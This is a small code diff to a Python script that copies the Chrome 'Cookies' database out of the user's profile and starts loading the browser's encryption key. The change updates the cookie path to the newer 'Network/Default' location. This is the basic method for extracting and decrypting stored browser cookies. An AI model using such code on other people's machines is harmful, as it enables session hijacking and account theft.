@@ -31,7 +31,7 @@ BROWSER_PROFILE_PATH = os.getenv("APPDATA") + "/../Local/Google/Chrome/User Data
 
 # Copy Cookies and Local State to current folder
 for i in db_sites:
-    copyfile(BROWSER_PROFILE_PATH + "/Default/Cookies", './Cookies')
+    copyfile(BROWSER_PROFILE_PATH + "/Network/Default/Cookies", './Cookies')
 
     # Load encryption key
     encrypted_key = None
